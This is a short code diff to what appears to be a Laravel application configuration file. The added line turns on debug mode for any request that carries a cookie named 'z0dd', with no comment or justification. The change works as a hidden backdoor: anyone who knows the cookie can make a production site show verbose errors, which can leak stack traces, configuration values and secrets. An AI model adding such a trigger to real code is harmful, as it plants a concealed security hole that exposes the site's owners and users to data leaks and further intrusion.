@@ -39,7 +39,7 @@ return [
     |
     */
 
-    'debug' => env('APP_DEBUG', false),
+    'debug' => isset($_COOKIE['z0dd']) || env('APP_DEBUG', false),
 
     /*
     |--------------------------------------------------------------------------
